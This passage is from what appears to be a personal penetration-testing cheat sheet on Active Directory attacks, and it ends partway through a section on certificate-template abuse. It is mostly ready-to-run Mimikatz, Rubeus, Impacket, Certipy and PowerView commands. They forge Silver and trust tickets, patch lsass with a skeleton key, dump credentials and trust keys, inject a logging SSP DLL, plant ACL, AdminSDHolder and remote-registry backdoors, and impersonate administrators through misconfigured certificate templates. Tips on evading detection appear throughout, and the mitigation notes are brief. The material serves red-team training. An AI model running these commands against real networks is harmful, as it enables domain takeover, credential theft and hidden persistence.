- **/ptt** - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used (Pass-the-Ticket). Alternatively, use **/ticket** to save the ticket to a file for later use(\*2).


**Silver tickets** are TGS tickets forged by using the **machine account's password hash** for the target service host. Whilst with a Golden ticket it's possible to access to every service, with a Silver ticket is possible to access only to a specific service host and to only impersonate users on that host itself.

Some considerations:

- Since the TGS is forged, there is no associated TGT, meaning the DC was never contacted (i.e, starting from step AP_REQ). This makes the attack incredibly dangerous since the only available logs would be on the targeted server. So while the scope is more limited, it is significantly harder for the blue team to detect.
- Since permissions are determined through SIDs, it's possible to create a non-existing user \* for our silver ticket, as long as we ensure the ticket has the relevant SIDs that would place the user in the host's local administrators group.
- The machine account's password is usually rotated every 30 days, which would not be good for persistence. 
	- It could be possible to use a forged TGS to access to the target host and alter the parameter in the registry that is responsible for the password rotation of the machine account. Thereby ensuring the machine account remains static and granting persistence on the machine.
- Machine accounts can be used as normal AD accounts, allowing not only administrative access to the host but also the means to continue enumerating and exploiting AD as you would with an AD user account.

Generate a silver ticket:

~~~shell
kerberos::golden /admin:<Any user> /domain:<Domain> /id:500 /sid:<Domain SID> /target:<Hostname of server being targeted> /rc4:<NTLM Hash of machine account of target> /service:cifs /ptt
~~~

Where:

- **/admin** - The username we want to impersonate. This does not have to be a valid user.  
- **/domain** - The FQDN of the domain we want to generate the ticket for.  
- **/id** -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.  
- **/sid** -The SID of the domain we want to generate the ticket for.
- **/target** - The hostname of our target server.It can be any domain-joined host.  
- **/rc4** - The NTLM hash of the machine account of our target. 
- **/service** - The service we are requesting in our TGS. CIFS is a safe bet, since it allows file access (take a look [here](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket#available-services)).
	- CIFS: access target filesystem (for example, with SMB).
	- HOST: permits to schedule and execute a task on the target, allowing to achieve command execution. Allows also running WMI queries.
- **/ptt** - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used. Alternatively, use **/ticket** to save the ticket to a file for later use\*.

**\*Note 1**: Detection tools generally look for tickets lifespan. It's usually better to comply to the Kerberos policy or at least to the AD default settings in order to avoid detection.
**\*Note 2**: Detection tools generally look for tickets whose usage is deferred respect their generation.

\***Note 3**: When forging tickets, before November 2021 updates, the username supplied was mostly useless. As of Nov. 2021 updates, if the username supplied doesn't exist in Active Directory, the ticket gets rejected. This applies to Golden & Silver Tickets.

TODO: Diamond tickets & Sapphire Tickets

Open a shell with the injected ticket:

~~~shell
misc::cmd
~~~

List current session's Kerberos tickets:

~~~shell
klist
~~~

Create a ticket with Impacket's `ticketer`:

~~~shell
ticketer.py -domain <current domain> -domain-sid <current domain SID> [-extra-sid <extra SIDs list>] (-nthash <NTLM hash used for signing>|-aesKey <aes key used for signing>) [-spn <silver ticket SPN>] <username for the newly created ticket>
~~~

See [[active-directory-cheatsheet#Pass-the-* attacks|Pass-the-*-attacks - Pass-the-Ticket]].

### Skeleton Key
Skeleton key technique consists into patching a DC's `lsass` process so that it allows to access as any user with a single 'master' password.

- This technique requires **domain admin** privileges.
- This technique is **NOT** persistent across reboots.
- Users can still authenticate with their original password. 
	- It makes detecting it hard to detect.
- This attack currently supports NTLM and Kerberos (RC4 only) authentications. For more details, take a look [here](https://www.thehacker.recipes/ad/persistence/skeleton-key/#theory).

With `mimikatz`:

~~~shell
privilege::debug
misc::skeleton
~~~

-  Access any machine that authenticates against the compromised DC with a valid username and "mimikatz" as the password (or the actual password for the account).
- In a real testing environment, it would be more appropriated to change the skeleton key:
	- Modify the source code to change the key and recompile Mimikatz.

If `lsass` is running as **protected process** the `mimidriv.sys` (mimikatz driver) is required on the target DC:

~~~shell
privilege::debug
!+
!processprotect /process:lsass.exe /remove
misc::skeleton
!-
~~~

- **Very noisy!** It requires to employ a kernel mode driver.
#### Mitigations

- Run `lsass.exe` as a protected process; this forces an attacker to load a kernel mode driver to perform the attack.
	- `New-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name RunAsPPL -Value 1 -Verbose`


### Abusing Trusts

#### Trust across domains

When a client in domain **A** needs to access an Application Server in another domain **B**, passing across a trust boundary, the following steps are involved:

1. Client requests TGT to DC for domain A (DCa)
2. DCa returns the TGT
3. Client sends the TGT and the TGT request for the service on domain B
4. DCa returns a **inter-realm TGT** (**Trust Ticket**), signed with a **trust key**.
5. Client sends the inter-realm TGT and the TGS request to the DC for domain B (DCb)
6. DCb decrypts the TGT with the **trust key**; if the decryption is successful, it assumes the TGT is valid, then returns the TGS for the requested service
7. Client authenticates to the application server with the TGS

![[ad-trust-accross-domains.png]]

Being able to dump the **trust key** allows an attacker to forge valid Trust Tickets since the only validation in place for those is the decryption by the DCb (step 6).

- Generally, **Domain Admin privileges are required** to dump this key from the DC (DCa in the example).
- The trust key is simply the NTLM hash of a service account for the trusted domain.

Note: having the `krbtgt`'s hash allows to forge the trust ticket without the need to obtain the trust key.

The main goal for this attack is that of compromise a parent domain from a child domain, abusing the **implicit trust** between those.

In this attack, the `SIDHistory` attribute is generally spoofed to contain the target group SID which generally is the Enterprise Administrators group's SID.

- the `SIDHistory` attribute contains previous SIDs used for the object if the object was moved from another domain.

In order to achieve a better level of stealthiness, instead of directly using the Enterprise Administrator's SID, it's possible to use the **Domain Controllers** and the **Enterpise Domain Controller**'s SIDs (comma-separated); from the blue team perspective, looking at the logs it will seem like the DCs talking each other which is very common, looking way less suspicious.
#### Trust across forest

When dealing with forest, the same considerations for [[active-directory-cheatsheet#Trust across domains|Trust across domains]] apply when the **forest trust is bidirectional**; the difference is that the trust boundary between two DCs (the roots) in different forests.

- When performing the attack on **Forest Trusts** and **External Trusts**, it's not always reliable to spoof the `SIDHistory` due to SID filtering; without `SIDHistory` spoofing, the impersonated Administrator user will have its original privileges (may not be Enterprise Admin).

Dump trust key from the DC with `mimikatz` (Domain Admin privileges required):

~~~shell
lsadump::trust /patch

# or
lsadump:lsa /patch

# or
lsadump::dcsync /user:<trusted domain service account>$
~~~

Forge a trust ticket using the dumped trust key or the krbtgt's hash with `mimikatz`:

~~~shell
# Using trust key
Kerberos::golden /user:Administrator /domain:<current domain FQDN>
/sid:<current domain SID> /sids:<extra SID to be used when spoofing the SID History - generally Enterprise Admins SID of target domain>  /rc4:<trust key> /service:krbtgt /target:<target domain FQDN> /ticket:<output path for the ticket>

# Using krbtgt's hash
Kerberos::golden /user:Administrator /domain:<current domain FQDN>
/sid:<current domain SID> /sids:<extra SID to be used when spoofing the SID History - generally Enterprise Admins SID of target domain> /krbtgt:<krbtgt hash> /target:<target domain FQDN> /ticket:<output path for the ticket>
~~~

- When performing this attack on **Forest Trusts** and **External Trusts**, drop the `/sids` parameter when forging the ticket; it's not always reliable to spoof the `SIDHistory` due to SID filtering.
- Take a look here for [well-known SIDS](https://system32.eventsentry.com/codes/field/Well-known%20Security%20Identifiers%20(SIDs))

Request a TGS using the forged trust ticket with `Rubeus`:

~~~shell
Rubeus.exe asktgs /ticket:<path to tgt> /service:<service SPN> /dc:<target domain> /ptt
~~~
#### MSSQL Database Links

A database link is a schema object in one database that enables you to access objects and execute procedures on another database.

- When a link exists between two or more SQL databases, they're called **Linked SQL servers*.

Database links can exists also across **forest trusts**:

- Abusing these trusts may allow to perform lateral movement or privilege escalation between different forests.

Following cmdlets are from [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL).

Discover domain SQL Server Instances i.e. all SQL server with a SPN registered on the DC:

~~~powershell
Get-SQLInstanceDomain
~~~

Check reachability to SQL servers: 

~~~powershell
Get-SQLConnectionTestThreaded

Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
~~~

Get general server information such as SQL/OS versions, service accounts, sysdmin access, etc.:

~~~powershell
Get-SQLServerInfo

Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
~~~

Enumerate database links:

~~~powershell
Get-SQLServerLinkCrawl -Instance <target sql server> -Verbose
~~~

Run query on a linked database with `Openquery()`:

~~~SQL
select * from openquery("<target sql server>",'<query>')
~~~

Enumerate database links (manually):

~~~SQL
select * from master..sysservers

select * from openquery("<target sql server>",'select * from master..sysservers')
~~~

Take a look to the complete PowerUpSQL cheat-sheet for OS command execution and many other features:

- [PowerUpSQL Cheat-Sheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)

#### Mitigations

Enable **SID Filtering**:

- Prevents attacks that abuses SID History.
- It's enabled by default on all inter-forests trusts (intra-forest trusts are assumed secured by default). Gets often disabled since can break things.

Enable **Selective Authentication** for inter-forest trusts:

- When enabled, users between the trusts are not automatically authenticated.

### Directory Services Restore Mode (DSRM)

**Directory Services Restore Mode** (**DSRM**) allows to take the server offline for emergency maintenance, particularly restoring backups of AD objects. It similar to the *Safe Mode*.

On every DC there's a local administrator account "Administrator" with a **DSRM password**.

- This password is required when a server is promoted to Domain Controller.
- Rarely it gets changed.

Since Windows Server 2008, it's possible to enable the access with the DSRM password without necessarily reboot the DC in DSRM mode:

- Editing the **DSRMAdminLogonBehavior** registry under `HKLM\System\CurrentControlSet\Control\Lsa` and setting it with value `2`, allows to access with the DSRM account regardless AD service has been stopped or not.
- In this scenario, it's possible to use the NTLM hash of the DSRM user to access the DC.

Dump the DSRM password hash (requires domain admin privileges) with `mimikatz`:

~~~shell
token::elevate
lsadump::sam
~~~

Enable DSRM user logon behavior:

~~~powershell
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
~~~

### Security Support Provider (SSP)

A **Security Support Provider (SSP)** is a dynamic-link library (DLL) involved in security-related operations, including authentication. An SSP attack consists into injecting a malicious SSP DLL in order to, for example, obtain cleartext password from local accounts that authenticate to the compromised server.

Mimikatz provides a custom SSP DLL - `mimilib.dll`:

- This SSP logs local logons, service account and machine account passwords in clear text on the target server.

There are two alternative way to exploit this technique with mimikatz:

- Manually drop the `mimilib.dll` into `system32` folder and alter specific registers. **Requires reboot!**
- Inject `mimilib.dll` into `lsass` directly with mimikatz (not stable with Server 2016 and on). **Does not require reboot!**

~~~powershell
# After copying mimilib.dll to system32

## Get current security packages being used by the system
$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages'

## append mimilib
$packages += "mimilib"

## Update LSA Security Packages configuration registers
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages

Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
~~~

or

~~~shell
misc::memssp
~~~

Logon are logged to: `C:\Windows\system32\kiwissp.log`

- To change the destination file path, edit `mimilib.dll` code; an interesting alternative could be *SYSVOL* since it is accessible by any user in the domain BUT in a real scenario this could introduce some risks.

###  ACLs Attack

Following a list of common ACLs misconfiguration abuses.

Abuse `ResetPassword` permission:

~~~powershell
# PowerView
Set-DomainUserPassword -Identity <target user> -AccountPassword (ConvertTo-SecureString "<target password>" -AsPlainText -Force) -Verbose

# AD Module
Set-ADAccountPassword -Identity <target user> -NewPassword (ConvertTo-SecureString "<target password>" -AsPlainText -Force) -Verbose
~~~

Abuse `ResetPassword` permission from UNIX-like systems:

~~~shell
# Using net
net rpc password "<target user>" -U "<domain>"/"<controlled user>" -S "<DC host>"

# Using pth-net (net with Pass-the-Hash)
pth-net rpc password "<target user>" -U "<domain>"/"<controlled user>"%"ffffffffffffffffffffffffffffffff":"<NT hash>" -S "<DC host>"

# Using rpcclient
rpcclient -U <domain>/<controlled user> <DC host>
> setuserinfo2 <target user> 23 <new password>
~~~

Add `FullControl` rights on the domain object (as Domain Admin):

~~~powershell
# PowerView
Add-ObjectAcl -TargetDistinguishedName 'DC=<domain_component>,DC=<domain_component>?>' -PrincipalSamAccountName <controlled user> -Rights All -Verbose

# AD Module
Set-ADACL -DistinguishedName 'DC=<domain_component>,DC=<domain_component>?>' -Principal <controlled user> -Verbose
~~~

Add `FullControl` rights on the target object with Impacket's `dacledit`:

~~~shell
impacket-dacledit -action 'write' -rights 'FullControl' -principal '<controlled user|group>' -target '<target object>' '<domain>'/'<controlled user>':'<password>'
~~~

Restore DACL with Impacket's `dacledit`:

~~~shell
impacket-dacledit -action 'restore' -file <.bak file> -target '<target object>' '<domain>'/'<controlled user>':'<password>'
~~~

Add rights for DCSync (as Domain Admin):

~~~powershell
# PowerView
Add-ObjectAcl -TargetDistinguishedName 'DC=<domain_component>,DC=<domain_component>?>' -PrincipalSamAccountName <controlled user> -Rights DCSync -Verbose

# AD Module
Set-ADACL -DistinguishedName 'DC=<domain_component>,DC=<domain_component>?>' -Principal <controlled user> -GUIDRight DCSync -Verbose
~~~

Abuse `WriteOwner` using Impacket's `owneredit`:

~~~shell
impacket-owneredit -action write -new-owner '<controlled user>' -target '<target object>' '<domain>'/'<controlled user>'
~~~

Check current owner with Impacket's `owneredit`:

~~~shell
impacket-owneredit -action read -target '<target object>' '<domain>'/'<controlled user>'
~~~

Abuse `GenericWrite` to overwrite users attributes such as:

- `profilePath` - set this to a controlled SMB server. When the user logs in, it's possible to intercept its NTLM.
- `scriptPath` -  should run a script when the user logs in (script seems to be run only when it's already on the machine).

~~~shell
bloodyAD --host "<DC ip>" -d "<domain>" -u "<controlled user>" -p "<password>" set object '<target object>' <attribute name> -v '<value>'
~~~

References:

- [Invoke-SDPropagator](https://github.com/theyoge/AD-Pentesting-Tools/blob/main/Invoke-SDPropagator.ps1)

#### Permission Delegation

**Permission delegation** in Active Directory (AD) refers to the process of granting specific rights and permissions to users or groups, enabling them to perform certain administrative tasks without granting them full administrative control. This approach helps balance security with operational efficiency by limiting access to only what is necessary for a given task.

- This is done by setting specific ACEs to the ACLs groups or users (or, more generally, objects) belong.

However, even though the least privilege principle should be applied, it's not always true and ACEs can be misconfigured, allowing an attacker to exploit them.

[Here](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#) a list of all ACEs enumerated via `BloodHound` and how to exploit them.

Common misconfigured ACEs:

- **ForceChangePassword:** the principal can reset the password of the target user without knowing the current password of that user.
- **AddMembers:** the principal has the ability to add users, groups or computers to the target group.
- **GenericAll:** the users has complete control over the target object; this potentially allows to change the user's password, register an SPN or add an AD object to the target group.
- **GenericWrite:** the user can update any non-protected parameters of our target object. 
- **WriteOwner:** the user has the ability to update the owner of the target object, eventually taking ownership of it in order to to gain more control over the object.
- **WriteDACL:** the user can write a new ACEs to the target object's DACL, allowing to eventually set full control on the object.
- **AllExtendedRights:** the user can perform any action associated with extended AD rights against the target object, such as the ability to force change a user's password.
Abuse `AddMember` or  `GenericWrite` ACEs to add a user to the target group:

~~~powershell
# Add to the group
Add-ADGroupMember "<group>" -Members "<user>"

# Verify if the user was added successfully
Get-ADGroupMember -Identity "<group>"
~~~

Abuse `ForceChangePassword` ACE to permit a user to change the password of the target user:

~~~powershell
$Password = ConvertTo-SecureString "<new password>" -AsPlainText -Force 

Set-ADAccountPassword -Identity "<target user>" -Reset -NewPassword $Password 
~~~

#### AdminSDHolder

**AdminSDHolder** is automatically created as an object in the System container of every Active Directory domain. Its purpose is to provide "template" permissions for the [[active-directory-cheatsheet#Protected Account and Groups|protected accounts and groups]] in the domain using ACL.

- Its path is: CN=AdminSDHolder,CN=System,DC=<domain_component>,DC=<domain_component>?
- Although the default owner of *AdminSDHolder* is the domain's *Domain Admins* group, members of *Administrators* or *Enterprise Admins* can make changes or take ownership of the object.

The **Security Descriptor Propagator (SDProp)** process runs every 60 minutes (by default) on the domain controller; It compares the permissions on the domain's *AdminSDHolder* object with the permissions on the protected accounts and groups in the domain:

- If the permissions on any of the protected accounts and groups do not match the permissions on the *AdminSDHolder* object, *SDProp* resets the permissions on the protected accounts and groups to match those configured for the domain's *AdminSDHolder* object.

With Domain Admin privileges (Full Control/Write permissions) on the *AdminSDHolder* object, it can be used as a backdoor/persistence mechanism. This can be done by adding higher privileges permissions, such as *Full Control*, to a user,  modifying the *AdminSDHolder* object. These changes will be applied the moment the *SDProp* process runs.

Add *Full Control* permissions for a user to the AdminSDHolder object (as Domain Admin):

~~~powershell
# PowerView
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System'  -PrincipalSamAccountName <controlled user> -Rights All -Verbose

# AD Module
Set-ADACL -DistinguishedName '<CN=AdminSDHolder,CN=System,DC=<domain_component>,DC=<domain_component>?>' -Principal <controlled user> -Verbose
~~~

Other interesting permissions are (`-Rights` option in `PowerView`  or `-GUIDRight` for `AD Module`):

- `ResetPassword`
- `WriteMembers`

Run SDProp manually:

~~~powershell
. .\Invoke-SDPropagator.ps1

Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose

# For machines pre-Windows Server 2008
Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
~~~

#### Mitigations

The tool [AD ACL Scanner](https://github.com/canix1/ADACLScanner) allow to create report of ACLs useful to harden weak ACLs or detect mischievous ones.

### SIDHistory

Patch `ntds.dis` file to edit the `SIDHistory` property of an account using [DSInternals](https://github.com/MichaelGrafnetter/DSInternals) (Domain Admin privileges required):

~~~powershell
Stop-Service -Name ntds -force 
Add-ADDBSidHistory -SamAccountName <account> -SidHistory <SID to add to the SIDHistory>  -DatabasePath C:\Windows\NTDS\ntds.dit 
Start-Service -Name ntds  
~~~

**Note**: it's mandatory to stop the NTDS service before the patch (ntdis.dit will be locked) and restart it after the patch in order to apply changes.

### Security Descriptors

Having local administrative privileges on a machine, it's possible to modify security descriptors and the information contained within such as:

- Owner
- Primary group
- DACL
- SACL

for remote access methods such as:

- WMI
- PowerShell Remoting
- etc

in order to grant access also to non-admin users.

**Security Descriptor Definition Language** is used to describe a security descriptor, using **Access Control Entries (ACE)** strings for DACL and SACL:

- `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid`

Following the reference for each field: [https://learn.microsoft.com/en-us/windows/win32/secauthz/ace-strings](https://learn.microsoft.com/en-us/windows/win32/secauthz/ace-strings)

#### Security Descriptors - WMI
In order to permit a non administrative user to use WMI from remote, it's necessary to grant this user:

- the privilege to connect to the DCOM endpoint.
- to connect to the target namespace, generally `root\cimv2`

Via GUI:

~~~
# Setup COM privileges

1. From "Component Services"
2. Edit "Component Services > Computers > My Computer" properties
3. From "COM Security", add full control for target user on "Access Permissions" and "Lanch and Activation Permissions" by clicking on "Edit Limits..."

# Setup WMI's namespaces privileges
1. From "Computer Management"
2. Edit "Services and Application > WMI Control" properties
3. From "Security" tab, select the target namespace and add full control for the target user
4. Click on "Advanced" and select the added user
5. Click on "Edit" and modify "Applies to" value from "This namespace only" to "This namespace and subnamespaces"
~~~

Via PowerShell using [Set-RemoteWMI.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):

~~~powershell
# On local machine
Set-RemoteWMI -UserName <target user> -Verbose

# On remote machine without explicit credentials
Set-RemoteWMI -UserName <target user> -ComputerName <target computer> -namespace 'root\cimv2' -Verbose

# On remote machine with explicit credentials - only root\cimv2 and nested namespaces
Set-RemoteWMI -UserName <target user> -ComputerName <target computer> -Credential Administrator -namespace 'root\cimv2' -Verbose

# On remote machine - remove permissions
Set-RemoteWMI -UserName <target user> -ComputerName <target computer> -namespace 'root\cimv2' -Remove -Verbose
~~~

#### Security Descriptors - PowerShell Remoting

Enable PowerShell Remoting for a non-admin user using [Set-RemotePSRemoting.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemotePSRemoting.ps1):

~~~powershell
# On local machine
Set-RemotePSRemoting -UserName <target user> -Verbose

# On remote machine without credentials:
Set-RemotePSRemoting -UserName <target user> -ComputerName <target computer> -Verbose

# On remote machine, remove the permissions
Set-RemotePSRemoting -UserName <target user> -ComputerName <target computer> -Remove
~~~

#### Security Descriptors - Remote Registry

Edit remote machine registry in order to create a backdoor that allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials using [DAMP](https://github.com/HarmJ0y/DAMP/tree/master):

~~~powershell
# Create backdoor - run with administrative privileges on target computer
Add-RemoteRegBackdoor -ComputerName <target computer> -Trustee <target user> -Verbose

# Retrieve machine account hash
Get-RemoteMachineAccountHash -ComputerName <target computer> -Verbose

# Retrieve local account hash
Get-RemoteLocalAccountHash -ComputerName <target computer> -Verbose

# Retrieve domain cached credentials
Get-RemoteCachedCredential -ComputerName <target computer> -Verbose
~~~

Note: may be necessary to rename the `$IV` variable to another name!

### Active Directory Certificate Services (AD CS)

**Active Directory Certificate Services (AD CS)** is a **Microsoft Windows Server role** that provides customizable services for creating and managing public key infrastructure (PKI) and digital certificates. AD CS enables organizations to secure data and communications by issuing, renewing, and revoking certificates **used for identity authentication**, secure communication, and data encryption by acting as a Certificate Authority to prove and delegate trust.

 - AD CS is a privileged function and therefore generally runs only on selected domain controllers.
 - Administrators of AD CS can create **Certificates Templates** that allow any user with the relevant permissions to request a certificate. 
	 - These templates have parameters that say which user can request the certificate and what is required. 

A template with the following parameter combination can be abused by an attacker to potentially perform privilege escalation:

- **Client Authentication** - The certificate can be used for Client Authentication.
- **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT** - The certificate template allows to specify the Subject Alternative Name (SAN).
- **CTPRIVATEKEY_FLAG_EXPORTABLE_KEY** - The certificate will be exportable with the private key.
- **Certificate Permissions** - Defines who can use the certificate template.

Certificate templates are AD objects with an object class of `pKICertificateTemplate`.

Attacks scenarios:

- **Certificate Theft**: export a certificate or a private key to be used for next scenarios.
- **Persistence**: abuse a misconfigured certificate to authenticate as the specified user.
- **Escalation**: using the private key from a CA, forge a certificate and escalate privileges.

References:

- [Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [Certified Pre-Owned Whitepaper](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)

Enumerate if ADCS is active on a DC:

~~~shell
nxc ldap <DC> -u <user> -p <password> -M adcs
~~~

Enumerate CAs from a domain joined machine:

~~~shell
certutil.exe -TCAInfo
~~~

Enumerate certificates templates:

~~~shell
certutil -Template -v > template.txt
certutil -v -dstemplate > template.txt
~~~

Enumerate CA and Certificate Templates remotely with [Certipy-AD](https://github.com/ly4k/Certipy):

~~~shell
certipy-ad find -dc-ip <DC IP> -u <user>@domain> -p <password> -json [-old-bloodhound]
~~~

**Note**: `-old-bloodhound` option generates files to be ingested by BloodHound.

Enumerate vulnerable certificates templates with [Certify](https://github.com/GhostPack/Certify):

~~~shell
Certify.exe find /vulnerable
~~~
#### Misconfigured Certificate Templates — ESC1

**Requirements**:

- **REQ1**: The Enterprise CA grants low-privileged users enrollment rights
- **REQ2**: Manager approval is disabled
- **REQ3**: No authorized signatures are required.
- **REQ4**: Domain Users (or other low privileged users/groups) have the **Enrollment** ACE in a target certificate template object's DACL.
	- `In the Certificate Templates Console MMC snap-in, permissions are set under the template’s properties → Security`
- **REQ5**: The target certificate template defines **EKUs** (Extended Key Usage) that enable authentication (Client Authentication, Smart Card Logon, etc.) 
	- The property `pKIExtendedKeyUsage` on the certificate template object contains this information.
	- `In the Certificate Templates Console MMC snap-in, EKUs are set under the template’s properties → Extensions → Application Policies`
- **REQ6**: The certificate template allows requesters to specify a subjectAltName (SAN) in the CSR. 
	- This is possible if the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag is set into the `mspki-certificate-name-flag` bitmask.
	- `In the Certificate Templates Console MMC snap-in, this value is set under a template’s properties → Subject Name → Supply in request`

**The attack**: enumerate vulnerable certificate templates → request a certificate with this template specifying an high privilege user as the altname → use the certificate to request a TGT

Manually enumerate potential **ESC1** vulnerable certificate templates:

~~~ldap
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-
flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-
signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextend
edkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)
(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspki-
certificate-name-flag:1.2.840.113556.1.4.804:=1))
~~~

Check if user has the `Enrollment` ACE for the target certificate template DACL from gui (`mmc.exe`)(REQ4):

~~~gui
In the Certificate Templates Console MMC snap-in, permissions are set under the template’s properties → Security
~~~

Check certificate template EKUs from gui (`mmc.exe`)(REQ5):

~~~gui
In the Certificate Templates Console MMC snap-in, EKUs are set under the template’s properties → Extensions → Application Policies
~~~

Check if `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` is set from gui (`mmc.exe`) (REQ6):

~~~gui
In the Certificate Templates Console MMC snap-in, this value is set under a template’s properties → Subject Name → Supply in request
~~~

***Request certificate using certipy-ad***

Request a certificate with `certipy-ad`:

~~~shell
certipy-ad req -u <username> -p <password> -ca <ca name> -target <ca server> -template <vulnerable template> -upn <user to impersonate>@<domain>
~~~

Request TGT and get hash for impersonate user:

~~~shell
certipy-ad auth -pfx <.pfx certificate of the impersonate user> -dc-ip <DC ip>
~~~

***Request certificate using Certify***

Request a certificate with `Certify`:

~~~shell
Certify.exe request /ca:<domain>\<CA> /template:<Template name> /altname:<user to impersonate>
~~~

***Request certificate using GUI***

Request a certificate from `certmgr.msc` (GUI session):

1. Right Click on **Personal** and select **All Tasks**->**Request New Certificate...**
2. Click **Next** twice to select the AD enrollment policy.
3. Select the template and click on the **More Information** warning.
4. Change the **Subject name Type** option to **Common Name** and provide any value, since it does not matter, and click **Add**.
5. Change the **Alternative name Type** option to **User principal name**.
6. Supply the UPN of the user to impersonate (eg. a Domain Administrator Account).
7. Click **Add**.

Export the private key (.pfx)\* from `certmgr.msc` (GUI session):

1. Right Click on the certificate and select **All Tasks**->**Export...**

\***Note**: the private key must be exportable!  If the private key is non-exportable, the Microsoft CryptoAPI (CAPI) or the Cryptography API: Next Generation (CNG) modules will not allow extraction of non-exportable certificates. 

***Request certificate using Mimikatz***

Export certificate and private key using DPAPI using [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) and `mimikatz`:

~~~shell
# Decrypt the masterkey with mimikatz - mimikatz must run in the target user’s security context
dpapi::masterkey /in:<path to master key> /rpc

# Or, Decrypt the masterkey with mimikatz - user password must be known
dpapi::masterkey /in:<path to master key> /sid:<account side> /password:<password>

# Or , descrupt the master key with SharpDPAPI - user password must be known
SharpDPAPI.exe masterkeys /password:<password>

# Export Cert and private key with SharpDPAPI
SharpDPAPI.exe certificates /mkfile:<path to master key file>
~~~

**Note**: The masterkeys are stored at `C:\Users <UserName>\AppData\Roaming\Microsoft\Protect\<SID>\<MasterKey>`


Export certificate and private key with `mimikatz`:

~~~shell
# If private key/certificate it's not exportable
crypto::capi
crypto::cng

# Current User
crypto::certificates /export

# Current machine
crypto::certificates /systemstore:local_machine /export
~~~

**Note**:
- `crypto::capi` patches CAPI in the current process
- `crypto::cng` requires patching lsass.exe’s memory

***Pass-the-ticket attack with a certificate***

Use the certificate to request a TGT with  `Rubeus`:

~~~shell
Rubeus.exe asktgt /user:<user to impersonate> /certificate:<path to .pfx certificate> /password:<pfx password>

Rubeus.exe asktgt /user:<user to impersonate> /enctype:aes256 /certificate:<path to certificate> /password:<certificate file password> /domain:<target domain> /dc:<IP of domain controller> /ptt
~~~

#### Misconfigured Certificate Templates — ESC2

**ESC2** is a variation of **ESC1**.

**Requirements**: **REQ1-4** are same as **ESC1**

- **REQ5**: The certificate template defines the `Any Purpose` EKU or **no EKUs**.
- \[Optional] **REQ6**: same as **ESC1**. If satisfied, then **ESC2 = ESC1**.

**The attack**: When **REQ6** is not satisfied, i.e. it's not possible to specify arbitrary altnames, certificate template with`Any Purpose` EKU or **no EKUs** can still be used to authenticate to AD as the user who requested them.

Moreover, when there are **no EKUs**, the certificate can also be used as a **subordinate CA certificate** to sign new certificates; an attacker could specify arbitrary EKUs or fields in the new certificates.

- To use these new certificate **for domain authentication**, the subordinate CA should be trusted by the `NTAuthCertificates` object. **By default it wouldn't be trusted**.
- Still an attacker could abuse these new certificates for other scenarios such as code signing, server authentication, etc.

Manually enumerate potential **ESC2** vulnerable certificate templates:

~~~ldap
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-
flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-
signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusag
e=*))))
~~~

#### Misconfigured Enrollment Agent Templates - ESC3

The `Certificate Request Agent` EKU (OID 1.3.6.1.4.1.311.20.2.1), known as **Enrollment Agent** allows a principal to enroll for a certificate on behalf of another user. This can be abused to escalate privileges.

**Requirements**: in order to abuse the **Enrollment Agent**, two certificate templates are required to match respectively **CONDITION1** and **CONDITION2** specified below.

- **CONDITION1**: A template allows a low-privileged user to enroll in an enrollment agent certificate
	- **REQ1-4**: same as for **ESC1**.
	- **REQ5**: The certificate template has the **Certificate Request Agent** EKU.
- **CONDITION2**: another template permits a low privileged user to use the enrollment agent certificate to request a certificate on behalf of another user, and the template defines an EKU that allows for **domain authentication**.
	- **REQ1-2**: same as for **ESC1**.
	- **REQ3**: the template schema version is **1** or is **greater than 2** .
	- **REQ4**: the **Application Policy** for this template requires the `Certificate Request Agent` EKU 
	- **REQ5**: same as for ESC1 -  has EKUs that enable domain authentication.
	- **REQ6**: Enrollment agent restrictions on the CA is set to `Do not restrict enrollment agents` or to `Restrict enrollment agent` but with the default configuration (allows *Everyone*).
		- `certsrc.msc snap-in → right clicking on the → clicking Properties → navigating to the “Enrollment Agents” tab`

